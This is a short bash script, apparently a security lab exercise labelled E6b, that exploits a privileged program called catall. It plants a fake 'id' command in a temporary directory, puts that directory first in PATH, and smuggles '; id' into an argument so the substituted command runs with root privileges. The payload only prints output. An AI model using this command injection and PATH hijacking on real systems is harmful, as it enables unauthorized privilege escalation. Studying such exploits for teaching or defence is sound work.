#!/bin/bash
# E6b: PATH substitutes the id command and runs it with the root 
# priviledges like in e6a
DIR=$(mktemp -d)
printf '#!/bin/sh\necho "replaced id command: $(/usr/bin/id)"\n' > "$DIR/id"
chmod +x "$DIR/id"
PATH="$DIR:$PATH" ./catall "x; id"
